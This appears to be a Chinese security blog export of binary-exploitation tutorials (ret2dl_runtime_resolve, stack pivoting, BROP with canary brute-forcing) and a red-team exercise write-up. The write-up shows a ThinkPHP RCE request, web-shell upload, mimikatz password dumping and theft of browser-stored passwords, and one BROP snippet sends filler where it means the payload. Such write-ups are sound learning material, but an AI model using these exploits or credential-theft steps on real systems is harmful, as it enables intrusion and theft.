找到.dynamic -&gt; 找到三个表的地址 -&gt; .rel.plt+reloc_offset -&gt; Elf32_Rel -&gt; Elf32_Sym[info&gt;&gt;8] -&gt; st_name -&gt; wirte字符串可以发现，在各个表的起始地址是固定的情况下，只要控制st_name、r_info、reloc_offset即可操作最后指向那个字符串，比如指向system字符串，就实现对Elf32_Rel中的r_offset的绑定，也就是对got表的绑定。栈迁移使EIP指向了新的栈的第二位，所以我们只需要在栈里面构造新的延迟绑定的操作即可，既然知道了st_name可以控制指向字符串，r_info又可以控制st_name，reloc_offset可以找到r_info的地址，那么我们就从reloc_offset起手，以上面的write操作为基础，通过改变reloc_offset的值来控制其执行新的write函数。这里的构造分为两个步骤来走：一、指令的操作二、栈中内容构造（前面注意过栈里面的内容是什么）如下图所示 先来看指令操作，通过将EIP指向填充plt0的单元，那么就会执行到plt表的首项，然后push操作，之后jmp到_dl_runtime_resolve函数地址，进行执行。这就是完全模仿了延迟绑定的一个步骤。其次再来看栈中的内容，栈顶是压入的link_map_obj，第二项就是我们伪造的reloc_offset（图中是用index_offset表示）。这两个条件完全与正常执行的一样，那么只需要伪造reloc_offset，并且使得.rel.plt + reloc_offset = write的rel{r_offset, r_info}即可。 12345678910111213141516171819202122## write cmd=&quot;/bin/sh&quot;rop = ROP(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)sh = &quot;/bin/sh&quot;## 获取起始地址plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addrrel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addrdynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addrdynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addrindex_offset = 0x20rop.raw(base_stage)rop.raw(plt0)rop.raw(index_offset)rop.raw(&apos;aaaa&apos;)rop.raw(1)rop.raw(base_stage + 80)rop.raw(len(sh))rop.raw(&apos;a&apos; * (80 - len(rop.chain())))rop.raw(sh)rop.raw(&apos;a&apos; * (100 - len(rop.chain())))##gdb.attach(r)r.sendline(rop.chain())r.interactive() 可以发现通过伪造reloc_offset可以成功执行write函数，那么继续伪造Elf32_Rel，并且使得.rel.plt + reloc_offset等于伪造的Elf32_Rel的地址，然后伪造结构体中的r_offset和r_info。如下图所示： 把r_offset（重定向入口的偏移）的地址伪造成需要执行的函数的got地址 （其实可以随便搞一个有的导入的函数的got地址）,再伪造r_info，使得r_info&gt;&gt;8后的值，通过Elf32_Sym[r_info&gt;&gt;8]可以找到write函数的.dynstr，然后继续正常执行（在这一步，这个直接使用现成的值即可，可以在代码的注释中看到）。那么问题来了怎么去寻找这个我们已经伪造的REL的位置呢？在上一个步骤也说到了.rel.plt + reloc_offset = write的rel{r_offset, r_info}，那么reloc_offset = 伪造的write的rel{r_offset, r_info}地址 - .rel.plt。看到这，有木有想过，只是到了这一步我们可以控制需要执行的函数吗？当然也可以控制，只是不是我们想要的，只能控制.dynsym中有的。 1234567891011121314151617181920212223242526272829## write cmd=&quot;/bin/sh&quot;rop = ROP(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)sh = &quot;/bin/sh&quot;plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addrrel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addrdynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addrdynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addr## write:rel_adder &#123;r_offset, r_info &#125;faker_reloc_addr = base_stage + 28 ## rop链长度为28 4*7 再下一个位置开始reloc## r_offset -&gt; write: gotr_offset = elf.got[&apos;write&apos;]## r_info -&gt; LOAD:08048338 Elf32_Rel &lt;804A010h, 507h&gt; ; R_386_JMP_SLOT writer_info = 0x507 index_offset = faker_reloc_addr - rel_pltfaker_reloc = p32(r_offset) + p32(r_info)rop.raw(base_stage)rop.raw(plt0)rop.raw(index_offset)rop.raw(&apos;aaaa&apos;)rop.raw(1)rop.raw(base_stage + 80)rop.raw(len(sh))rop.raw(faker_reloc)rop.raw(&apos;a&apos; * (80 - len(rop.chain())))rop.raw(sh)rop.raw(&apos;a&apos; * (100 - len(rop.chain())))##gdb.attach(r)r.sendline(rop.chain())r.interactive() 成功伪造Elf32_Rel，程序可以顺利执行，接下来再去伪造Elf32_Sym。如下图所示： 那么就是对Elf32_Sym的st_name下手，因为他是决定执行哪个函数的关键（st_name+.dynstr），并且让Elf32_Sym[r_info&gt;&gt;8]来找到我们伪造的Elf32_Sym。先来伪造Elf32_Sym，我就是可以通过伪造st_name来执行我们需要的函数，直接把st_name赋值0x00000054，这样st_name+.dynstr找到write函数，具体st_name怎么计算方法下一步再说，结构体的其他变量的值也要伪造出来，文章开头的内容提到了。需要注意的是，因为.dynsym里的Elf32_Sym结构体都是0x10字节大小，因此需要对齐（在代码中可以具体看到）。最后再来看伪造r_info，通过Elf32_Sym[r_info&gt;&gt;8]可以找到伪造的write函数的Elf32_Sym，r_info的高八位就是（伪造的Elf32_Sym地址减去.dynsym）/0x10。这里也有个注意点，r_info 的是由重定向入口的类型和符号组成的，符号作为高八位是需要伪造的下标，类型是R_386_JUMP_SLOT，也就是0x7，最后r_info = ((伪造的Elf32_Sym地址减去.dynsym)/0x10)&lt;&lt;8 | 0x7。此时可以发现我们又进了一步，可以通过st_name 来找到指定函数的dynstr中的函数符号了。换一种说法 也就是说我们此时可以通过st_name这个偏移来指向我们自己可控制的区域里面，我们这个区域构造一个函数的Elf32_Sym那么就实现任意函数绑定。 123456789101112131415161718192021222324252627282930313233343536373839## write cmd=&quot;/bin/sh&quot;rop = ROP(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)sh = &quot;/bin/sh&quot;plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addrrel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addrdynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addrdynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addrfaker_reloc_addr = base_stage + 28 ## write:rel_addr 4*7 == 28 index_offset = faker_reloc_addr - rel_plt ## plt: push index_offset## r_offset -&gt; write: gotr_offset = elf.got[&apos;write&apos;]## faker_symfaker_sym_addr = base_stage + 36 ## 28 + 2*4 == 36align = 0x10 - ((faker_sym_addr - dynsym) &amp; 0xf) # aligin 0x10 这是Elf32_Sym结构体，每个结构体为0x10字节大小faker_sym_addr += align ## 进行对齐index_sym = (faker_sym_addr - dynsym)/0x10 # struct &#123;0x10&#125;Elf32_Sym index_sym只是下标Elf32_Sym[index_sym]，来取结构体，每个结构体大小是0x10，所以偏移除以0x10才是下标## write:Elf32_Rel &#123;r_offset, r_info &#125;r_info = (index_sym &lt;&lt; 8) | 0x7 # r_info&gt;&gt;8 = index_sym | R_386_JUMP_SLOTfaker_reloc = p32(r_offset) + p32(r_info)## write: LOAD:08048228 Elf32_Sym &lt;0x00000054, 0, 0, 12h, 0, 0&gt; ; &quot;write&quot;st_name = 0x00000054faker_sym = flat(st_name,0,0,0x12)rop.raw(base_stage)rop.raw(plt0)rop.raw(index_offset)rop.raw(&apos;aaaa&apos;)rop.raw(1)rop.raw(base_stage + 80)rop.raw(len(sh))rop.raw(faker_reloc)rop.raw(&apos;a&apos;*align) ## padding to align 因为对齐缘故 faker_sym_addr（本来是计算好的，是连续的地址）可能会变，也就是会+align，所以rop进行填充时的地址也需要+align，保证faker_sym对齐rop.raw(faker_sym)rop.raw(&apos;a&apos; * (80 - len(rop.chain())))rop.raw(sh)rop.raw(&apos;a&apos; * (100 - len(rop.chain())))##gdb.attach(r)r.sendline(rop.chain())r.interactive() 程序依然顺利执行，现在到了伪造任意函数的时候了，伪造STR，直接在选定位置 system\x00即可。那么这个关键是st_name怎么写，使得st_name+.dynstr == 伪造system的地址，st_name=伪造system的地址-.dynstr。 1234567891011121314151617181920212223242526272829303132333435363738394041## write cmd=&quot;/bin/sh&quot;rop = ROP(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)sh = &quot;/bin/sh&quot;+&apos;\00&apos;plt0 = elf.get_section_by_name(&apos;.plt&apos;).header.sh_addrrel_plt = elf.get_section_by_name(&apos;.rel.plt&apos;).header.sh_addrdynsym = elf.get_section_by_name(&apos;.dynsym&apos;).header.sh_addrdynstr = elf.get_section_by_name(&apos;.dynstr&apos;).header.sh_addrfaker_reloc_addr = base_stage + 28 ## write:rel_addr 4*7 == 28 index_offset = faker_reloc_addr - rel_plt ## plt: push index_offset## r_offset -&gt; write: gotr_offset = elf.got[&apos;write&apos;]## faker_symfaker_sym_addr = base_stage + 36 ## 28 + 2*4 == 36align = 0x10 - ((faker_sym_addr - dynsym) &amp; 0xf) # aligin 0x10faker_sym_addr += align index_sym = (faker_sym_addr - dynsym)/0x10 # struct &#123;0x10&#125;Elf32_Sym## write:Elf32_Rel &#123;r_offset, r_info &#125;r_info = (index_sym &lt;&lt; 8) | 0x7 # r_info&gt;&gt;8 = index_sym | R_386_JUMP_SLOTfaker_reloc = p32(r_offset) + p32(r_info)faker_str_addr = faker_sym_addr + 0x10 ## behind of Elf32_Rel## write: LOAD:08048228 Elf32_Sym &lt;st_name, 0, 0, 12h, 0, 0&gt; ; &quot;write&quot;st_name = faker_str_addr - dynstrfaker_sym = flat(st_name,0,0,0x12)rop.raw(base_stage)rop.raw(plt0)rop.raw(index_offset)rop.raw(&apos;aaaa&apos;)rop.raw(base_stage + 80)rop.raw(&apos;a&apos;*8)rop.raw(faker_reloc)rop.raw(&apos;a&apos;*align) ## padding to align rop.raw(faker_sym)rop.raw(&apos;system\x00&apos;)print len(rop.chain())rop.raw(&apos;a&apos; * (80 - len(rop.chain())))rop.raw(sh)rop.raw(&apos;a&apos; * (100 - len(rop.chain())))gdb.attach(r)r.sendline(rop.chain())r.interactive() 这里有个关于pwntools自动对齐的操作，如下图，发现已经计算好的base_stage+80是‘aa/bin/sh’。 然后改为偏移82即可执行命令。 经过调试发现，我们代码中是添加14个a（80-len(rop.chain())=14），结果有18个a，经过测试发现，这个a是这样分的：a✖️2 + a✖️14 + a✖️2，前两个a是system\x00补的，后两个是14个a补齐的，因此base_stage+80刚好是这个‘aa/bin/sh’的起始地址。 建议直接拼接，这样就免除了麻烦。 12345678910111213141516payload2 = &apos;aaaa&apos;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &apos;AAAA&apos;payload2 += p32(base_stage + 80)payload2 += &apos;aaaa&apos;payload2 += &apos;aaaa&apos;payload2 += faker_reloc payload2 += &apos;a&apos; * alignpayload2 += faker_sym payload2 += &quot;system\x00&quot;payload2 += &apos;a&apos; * (80 - len(payload2))payload2 += shpayload2 += &apos;a&apos; * (100 - len(payload2))r.sendline(payload2)r.interactive() 最后直接贴上wiki里使用roputils的exp，发现我们理解原理了很久，payload的rop链构造了很久，直接一个roputils直接搞定，解题方法简单。 12345678910111213141516171819202122232425from roputils import *from pwn import processfrom pwn import gdbfrom pwn import contextr = process(&apos;./main&apos;)context.log_level = &apos;debug&apos;r.recv()rop = ROP(&apos;./main&apos;)offset = 112bss_base = rop.section(&apos;.bss&apos;)buf = rop.fill(offset)buf += rop.call(&apos;read&apos;, 0, bss_base, 100)## used to call dl_Resolve()buf += rop.dl_resolve_call(bss_base + 20, bss_base)r.send(buf)buf = rop.string(&apos;/bin/sh&apos;)buf += rop.fill(20, buf)## used to make faking data, such relocation, Symbol, Strbuf += rop.dl_resolve_data(bss_base + 20, &apos;system&apos;)buf += rop.fill(100, buf)r.send(buf)r.interactive() 0x04 尾记 还未入门，详细记录每个知识点，为了能更好地温故知新，也希望能帮助和我一样想要入门二进制安全的初学者，如有错误，希望大佬们指出。参考:ctfwikiROP高级用法之ret2_dl_runtime_resolveELF file通过ELF动态装载构造ROP链 （ Return-to-dl-resolve）]]></content>
      <tags>
        <tag>二进制安全</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[看懂栈迁移]]></title>
    <url>%2F2020%2F09%2F27%2F1%2F</url>
    <content type="text"><![CDATA[举头望明月，低头思故乡 0x01 原因 由于原来溢出空间大小不足以承载payload，因此栈迁移就诞生了，解决溢出空间不足的问题。比如：1234int vuln()&#123; char buf[80]; return read(0, buf, 100);&#125; 上面这个例子的溢出空间是0x14，不足以承载我们构造的payload，既然空间不足，我们就创造一个空间足够大的新的栈空间。 0x02 原理 这是一个递进的过程。首先怎么识别我们构造的栈是一个新的栈空间呢？那就需要ESP和EBP来配合，EBP和ESP之间的内存单元就是程序可识别的栈空间。那么怎么让ESP和ESP去指向新的栈空间呢？基于栈溢出，我们能够知道，在栈溢出中，影响到的寄存器中有EBP，ESP，那么我们就可以通过构造payload来实现ESP和ESP的值。关键指令：一、在存在溢出漏洞的函数中，它的倒数第两条指令是leave，也就是move esp, ebp; pop ebp，这就可以改变EBP的值。二、还是上面那一条命令，leave=&gt;move esp, ebp; pop ebp，这个也可以通过ebp的值来改变esp的值。下面我们看一下具体的利用过程： 执行move esp, ebp，使得esp指向1处，然后执行pop ebp;此时ebp寄存器就会执行fake_ebp执行ret时，eip执行read函数，此时就会执行read函数，我们传入一个fake_ebp_2的十六进制（这个是作为栈底地址），此时在fake_ebp地址处（ESP指向地址）的值为fake_ebp_2。read函数执行返回后执行leave_ret命令，这里可以分为三个命令来执行。3-1时，EBP和ESP都指向了fake_ebp的位置3-2时，EBP指向了fake_ebp_2，这里就是栈底了，ESP指向下一个内存单元，也就是ret_addr处3-3时，ESP继续指向下一个内存单元，EIP的值就是ret_addr的值。此时栈迁移就完毕了，我们就可以在一个新的栈里面构造payload了，通过上述可以发现，我们可以3-3的部分入手进行利用，通过2处的read函数写入满足条件的payload就可以执行命令。 0x03 实现方式 以XDCTF2015的pwn200为例子。 one1234567891011121314151617181920212223242526272829303132333435363738from pwn import *context.log_level = &apos;debug&apos;context.terminal = [&apos;deepin-terminal&apos;, &apos;-x&apos;, &apos;sh&apos; ,&apos;-c&apos;]elf = ELF(&apos;bed0c68697f74e649f3e1c64ff7838b8&apos;)r = process(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)rop = ROP(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)offset = 108 ## find stack overflow lengthbss_addr = elf.bss()leave_ret = 0x08048481 ## ROPgadget --binary bed0c68697f74e649f3e1c64ff7838b8 --only &apos;leave|ret&apos;read_plt = elf.plt[&apos;read&apos;]r.recvuntil(&apos;Welcome to XDCTF2015~!\n&apos;)## stack pivoting to bss segment## new stack size is 0x800stack_size = 0x800base_stage = bss_addr + stack_size## padding 108 rop.raw(&apos;a&apos; * offset)## faker_ebp1rop.raw(base_stage)### stack pivoting, set esp = base_stagerop.raw(flat(read_plt,leave_ret,0, base_stage, 100))## print rop.dump()##gdb.attach(r)r.sendline(rop.chain())## write sh=&quot;/bin/sh&quot;rop = ROP(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)sh = &quot;/bin/sh&quot;rop.raw(base_stage)rop.write(1, base_stage + 80, len(sh))rop.raw(&apos;a&apos; * (80 - len(rop.chain())))rop.raw(sh)rop.raw(&apos;a&apos; * (100 - len(rop.chain())))##gdb.attach(r)r.sendline(rop.chain())r.interactive() 执行两次fini来到read函数 把payload写到堆栈中，leave;ret，对ebp进行变更 执行payload中的write函数，将fake_ebp_2和write函数写入新的堆栈里面 执行leave;ret，打印出来“/bin/sh” the other123456789101112131415161718192021222324252627282930313233343536from pwn import *context.log_level = &apos;debug&apos;context.terminal = [&apos;deepin-terminal&apos;, &apos;-x&apos;, &apos;sh&apos; ,&apos;-c&apos;]elf = ELF(&apos;bed0c68697f74e649f3e1c64ff7838b8&apos;)r = process(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)rop = ROP(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)offset = 112bss_addr = elf.bss()leave_ret = 0x08048481read_plt = elf.plt[&apos;read&apos;]r.recvuntil(&apos;Welcome to XDCTF2015~!\n&apos;)## stack pivoting to bss segment## new stack size is 0x800stack_size = 0x800base_stage = bss_addr + stack_size### paddingrop.raw(&apos;a&apos; * offset)### read 100 byte to base_stagerop.read(0, base_stage, 100)### stack pivoting, set esp = base_stagerop.migrate(base_stage)r.sendline(rop.chain())## write sh=&quot;/bin/sh&quot;rop = ROP(&apos;./bed0c68697f74e649f3e1c64ff7838b8&apos;)sh = &quot;/bin/sh&quot;rop.write(1, base_stage + 80, len(sh))rop.raw(&apos;a&apos; * (80 - len(rop.chain())))rop.raw(sh)rop.raw(&apos;a&apos; * (100 - len(rop.chain())))gdb.attach(r)r.sendline(rop.chain())r.interactive() 这里的区别是，注意看1，2，3处，在3处的时候ebp才变化的，也就是先在新的栈上写完payload，然后才开始执行迁移，注意一下3处，0x804a820与0x804a81c相差4。 0x04 尾记 还未入门，详细记录每个知识点，为了能更好地温故知新，也希望能帮助和我一样想要入门二进制安全的初学者，如有错误，希望大佬们指出。]]></content>
      <tags>
        <tag>二进制安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[某市HW攻防演练部分总结]]></title>
    <url>%2F2020%2F09%2F08%2F1%2F</url>
    <content type="text"><![CDATA[今年护网犹如生娃，十月怀胎，奶粉备好，突然晚产；去了医院，月嫂都请好了，又不生了需要推迟 0x01 前言 HW突然临时取消，听到原因差点没被吓到，真的扯，然后被拉去参加了某市组织的网络安全攻防演练，应该是自查吧。拿到目标，大佬们都开动了，掏出自己神器就开始干。由于太菜，挑软柿子捏，瞄准了某市某学校这个目标，开始简单的信息收集，子域名，端口，c端…..，其实想找后台的，根据经验来说，弱口令太多了。可惜没有发现，在等待收集结果的时候，开始对其公众号进行试探性地测试。 0x02 总攻 目标：某市某学校突破口：公众号”某市某互动平台”-&gt;日常管理 发现这个居然是tp框架，最终理想结果当然是rce，访问index.php?s=captcha，返回验证码，直接上payload： 1234567891011121314POST /****/index.php?s=captcha HTTP/1.1Host: *****Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; MuMu Build/V417IR; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36 MMWEBID/4428 MicroMessenger/7.0.17.1720(0x27001134) Process/tools WeChat/arm32 NetType/WIFI Language/zh_CN ABI/arm32Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Encoding: gzip, deflatecontent-type: application/x-www-form-urlencoded;charset=utf-8Accept-Language: zh-CN,en-US;q=0.8Cookie: PHPSESSID=3i48ekanekc6jlj6i9pstl9r36X-Requested-With: com.tencent.mmConnection: closeContent-Length: 59_method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami 看到结果的时候，心中一喜 admin权限，直接写shell，蚁剑连接shell : http://ip/a.php ping服务器获取出口IP：*.*.*.* 扫描发现，3389是开的，传个mimikatz，dump出密码 账号 Administraor密码 *（密码过于敏感）情况特殊，直接登陆即可，没有做其他的操作。记录下基本信息：1234系统：windows 2008 r2杀软：360主机卫士 360杀毒 安全狗三个网卡工作组 一套流程形如流水，因为一个目标分值是死的，1w分，所以得速度越快越好，不然分值被其他队瓜分了。 幸好老天助我，这台机器似乎是管理机，打开浏览器，与细想状态一样，直接获取浏览器中存储的密码 巧的是找到了网站集群管理系统，可对管理的站点上传shell。 这都是拿分点啊，只不过感觉这分都是找出来的（毫无技术含量，我真菜），另外这是宝塔，通过IP:888/pma可以直接登录数据库 0x03 收尾 很菜，水了一篇文章，举办方禁止继续往下深入。通过这次演练，让我明白了，只要队友牛逼，躺着也能起飞，收获巨大，学习了很多，感谢大佬们。]]></content>
      <tags>
        <tag>渗透</tag>
        <tag>getshell</tag>
        <tag>护网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[再探ROP(下)]]></title>
    <url>%2F2020%2F09%2F07%2F1%2F</url>
    <content type="text"><![CDATA[终于开学啦！前几天没有课刚好可以记录下知识 0x00 前记 先说一下这篇文章的脉络结构：一、ret2reg 的学习和理解二、brop 的学习和探讨ret2reg的知识就是就是对前面知识的变换，很简单，所以不做深入，其实就是ret2addr的演变。在概述里面会简单说一下brop部分，这个有趣的内容。 以上是一个分割线，这里步入正题。brop，早在2014年，发表在Oakland的一篇文叫Hacking Blind，作者是来自Standford的Andrea Bittau， 这是一位巨佬级人物，看完他的论文后真的很佩服，在当时就把这个技术讲述的淋漓尽致（论文什么的后续会细说，这里就是抛砖引玉）。那为什么要写这篇文章呢？一、记录自己的学习历程，算是一个备忘录，俗话说：好记性不如烂笔头。二、在学习中（这里强调一下，作为小白的我，从一片空白到刚刚接触）踩过坑，怎么一步一步小白式的理解，或者大言不惭一下：通熟易懂，把涉及的知识面、知识点都覆盖到。好了，开始今天的表演，show time～ 0x01 ret2reg起因 安全人员为保护免受ret2addr攻击，想到了一个办法，那就是地址混淆技术。该述语英文称为 Address Space Layout Randomize，直译为地址随机化。该技术将栈，堆和动态库空间全部随机化。在32位系统上，随机量在64M范围；而在64位系统，它的随机量在2G范围，因此原来的ret2addr技术无法攻击成功。ret2addr其实就是我们初探ROP说到的方法，具体请见这篇文章。不过虽有有了保护，攻与守总会在相辅相成，互相促进，互相进步，因此很快攻击者想到另一种攻击方法ret2reg，即return-to-register，返回到寄存地址执行的攻击方法。 原理 1） 存在栈溢出漏洞，满足ret2shellcode利用条件，开启了aslr，没有开启pie2）能拿到原文件，并且找到了与我们可控的栈空间有关联的寄存器reg13）栈溢出覆盖ret addr位置为call *reg1指令的地址，此时栈中写入了shellcode，找到的reg1存储的地址为shellcode的起始地址123普及一下aslr和pie的区别：aslr，直译为地址随机化。该技术将栈，堆和动态库空间全部随机化。pie，linux gcc编译器随后提供了fpie选项，此编译后修补aslr的漏洞，除了将栈，堆和动态库空间全部随机化，还把整个程序地址混淆了。 只要理解了ret2shellcode，只需要找到一个可控存储内容的寄存器，再有一条call *reg的指令即可完成此攻击。说到底，寄存器仅仅是一个中间介质。由于简单，仅仅是ret2shellcode的升级，就不再展开细说了，开始让我激动的第三部分 0x02 brop 第一部分很简单，有了上篇文章对ret2csu的铺垫，继续。在探讨brop之前我们得先了解一下概念和几点基本知识，能够帮助我们继续往下探讨： 概述 开头已经引入了一些内容，这里补充一下BROP攻击，全称Blind Return Oriented Programming Attack，是基于一篇发表在Oakland 2014的论文Hacking Blind，作者是来自Standford的Andrea Bittau。引用原文一句话：通过BROP攻击，无需拥有目标二进制文件就可以编写漏洞利用程序。它需要堆栈溢出，并且服务必须在崩溃后重新启动。根据服务是否崩溃（即，连接关闭还是保持打开状态），BROP攻击能够构建导致Shell的完整远程利用。BROP攻击会远程泄漏足够的小工具来执行写系统调用，然后将二进制文件从内存转移到攻击者的套接字。之后，可以执行标准的ROP攻击。除了攻击专有服务外，BROP在针对不公开使用特定二进制文件（例如从源代码安装程序，Gentoo盒等安装）的开源软件时非常有用。当针对专有服务进行测试时，该攻击完成了4,000个请求（在几分钟内），并且在nginx和MySQL中存在实际漏洞。有时在服务器中看到的根本问题是，它们在崩溃后派生了一个新的工作进程，而没有任何重新随机化（例如，没有execve跟随派生）。例如，nginx就是这样做的。原文地址：点击直达 仔细阅读上述文字和文章，大体的概念和用处已经一目了然了。这里再给出相关的paper和slidepaper - 点击直达slide - 点击直达 根据以上文章大家可以学到作者Andrea Bittau的绝妙思路和操作，仔细研读后就能领悟到其中的精华（看了翻译的的论文，晕晕的，太难了，来自小白对大佬的仰望，不说这些，还是来点实际的，老老实实的学习）继续探讨前要明白两个概念：stop gadget：一般情况下，栈上的return address随意覆盖的内存地址的话，程序有很大可能性会挂掉，比如，该return address指向了一段代码区域，里面会有一些对空指针的访问造成程序crash，又比如p64(0)。那么与之相反（程序不会crash）就是stop gadget。useful gadget：我们能够作为payload的gadget，比如我们后面会说到的pop rdi; ret。有了这些知识后，我们继续往下走。 逆向思维切入 看过好多相关的文章，大佬们写得太棒啦（深深的膜拜中），由于涉及的内容过多，对于我这个初学者来说，学习第一遍，云里雾里，摸不清头脑（究其原因，还是自己太菜了）。于是为了帮助这么菜的我更好的学习，自己清晰地梳理一下我是怎么样从无到有的学习步骤： 搭建环境 从hctf2016 ——“出题人失踪了”这道题目开始说起，本地搭建环境，编译一个开启了canary的保护机制的文件gcc -z noexecstack -fno-stack-protector -no-pie -o brop brop.c使用Socat建立通道进行访问，可以发现1234pwn@MacBook-Pro ~ % nc 10.112.26.131 1000WelCome my friend,Do you know password?123No password, no game 在没有elf文件的情况下进行，显然就是brop手法运用的场景。nc后，程序会有一个输入等待地方，依照之前的知识，可以知道这里很有可能就存在栈溢出漏洞,继续输入过长的字符，只需要溢出时抛出异常即可。 1234pwn@MacBook-Pro ~ % nc 10.112.26.131 1000WelCome my friend,Do you know password?11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111pwn@MacBook-Pro ~ % 溢出长度和爆破canary 既然要栈溢出，根据前面的经验，需要知道溢出临界点，也即是填充的长度是多少，很简单，给出代码： 1234567891011121314151617181920212223from pwn import *def getLength(): i = 1 while True: sh = remote(&apos;10.112.26.131&apos;, 1000) sh.recvuntil(&apos;WelCome my friend,Do you know password?\n&apos;) sh.send(i * &apos;a&apos;) try: byte = sh.recv() except Exception as e: print(&quot;[+] sucessfully! length is &quot; + str(i-1) + &quot;\n&quot;) sh.close() exit() length = byte.decode() sh.close() if length.startswith(&apos;No password&apos;): print(&quot;[*] length greater than &quot; + str(i) + &quot;\n&quot;) else: exit() i = i + 1 sh.close()if __name__ == &quot;__main__&quot;: getlength() 123456[x] Opening connection to 10.112.26.131 on port 1000[x] Opening connection to 10.112.26.131 on port 1000: Trying 10.112.26.131[+] Opening connection to 10.112.26.131 on port 1000: Done[+] sucessfully! length is 72[*] Closed connection to 10.112.26.131 port 1000[Finished in 1.6s] 可以发现length是72，由于原题没有开启canary保护机制，所以就省略了一步操作，我们重在于学习，因此开启canary保护机制重新利用，这里有几点需要注意：BROP对存在栈溢出的ELF进行指令盲注，需要几个前提：一、进程crash后可以重启，这个当前例子即可满足；二、进程通过fork重启，从而保持多次重启程序时的状态不变，比如canary不变。给出爆破cannay代码：12345678910111213141516def getCanary(): sh = remote(&apos;10.112.26.131&apos;, 10001) canary = &apos;\x00&apos; payload_base = 72 * &apos;a&apos; for i in range(7): payload_base = payload_base + canary for j in range(256): sh.recvuntil(&apos;WelCome my friend,Do you know password?\n&apos;) payload = payload_base payload += chr(j) sh.send(payload) byte = sh.recv() if &apos;Welcome&apos; in byte: canary = chr(j) break print(payload_base) 参考：canary各种姿势绕过的bin1，以上只是其中的一个插曲，继续探讨正题。 如何getshell 有了长度，也可以知道是存在栈溢出漏洞，岂不是按照之前的方法getshell就完成了吗？接下来一顿操作猛如虎。 现在我们知道溢出临界点位置，下面就是如何构造payload进行getshell。这里思路其实很简单，都是利用栈溢出来进行getshell，特殊的只是需要brop的方法。根据现有知识（从第一篇文章读到这，脑海里仅仅只有一般的栈溢出利用）我们对于此题或者说怎么样去运用此方法。其实就是实现如下操作即可，如下图： 相应的，给出代码：123456def getShell(pop_rdi_addr, binsh_addr, system_adddr): payload = &apos;a&apos; * 72 + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_adddr) sh = remote(&apos;10.112.26.131&apos;, 1000) sh.recvuntil(&apos;WelCome my friend,Do you know password?\n&apos;) sh.send(i * &apos;a&apos;) sh.interactive() 是不是与之前的知识有了对应？但是呢，问题也随之来了，在没有elf文件的时候，pop_rdi_addr, binsh_addr, system_adddr这三个参数如何得来呢？下面就是解决此三个三个参数了。 寻找直接条件寻找 pop_rdi_addr12pop rdi；ret; 这一个是不是很眼熟呢？在第一部分的ret2csu中有一个地方是可以得到此gadgets，继续往下看： 注意这里，当然没有pop rdi的身影，这里我们要知道汇编语言指令是机器指令的一种符号表示，也就是说两者是一一对应的，比如0x90就是nop指令。这里插入一个小插曲，如下图所示： 12345678910gdb-peda$ x /1x 0x4007a00x4007a0 &lt;__libc_csu_init+96&gt;: 0x5f415e41gdb-peda$ x /1x 0x4007a10x4007a1 &lt;__libc_csu_init+97&gt;: 0xc35f415egdb-peda$ x /1x 0x4007a20x4007a2 &lt;__libc_csu_init+98&gt;: 0x90c35f41gdb-peda$ x /1x 0x4007a40x4007a4 &lt;__libc_csu_init+100&gt;: 0x2e6690c3gdb-peda$ x /1x 0x4007a50x4007a5: 0x0f2e6690 上述gdb处需要知道有一个小常识，小端存储，然后再与上图相对照。小插曲结束，我们回到正题，为什么要有这一个小插曲呢？根据偏移值的不同，导致编译时候对齐位置不同，可以让机器编码变成不同指令了，依然是以上图为例：123456gdb-peda$ x /1i 0x4007a1 0x4007a1 &lt;__libc_csu_init+97&gt;: pop rsigdb-peda$ x /1i 0x4007a3 0x4007a3 &lt;__libc_csu_init+99&gt;: pop rdigdb-peda$ x /1i 0x4007a4 0x4007a4 &lt;__libc_csu_init+100&gt;: ret 偏移量不同，对齐后就会形成我们想要的指令，当然我们也可以使用ida，修改一下byte，进行对比看一下： 说么这么多废话就是为了找到这一个gadgets，接下来就是寻找binsh_addr, system_adddr，这个现在细说不合适，大体说一下，后面会水到渠成的理解。我们在得到put@got表的内容后，通过偏移计算出 system() 函数和字符串 /bin/sh 的地址，这里其实就是前面的方法的知识。 寻找间接条件 说到这，我们只能确定直接getshell的条件，先捋一下，清晰条理：一、通过通用gadgets（__libc_csu_init）寻找到pop_rdi_addr二、得到put@got表的内容后，寻找到binsh_addr和 system_adddr那么相应的问题就来了一、如何能找到通用gadgets（__libc_csu_init）呢？并且顺利找到pop_rdi_addr二、如何获取put@got表的内容因为偏移的计算在前面的方法中已经使用过，可以去回顾一下。 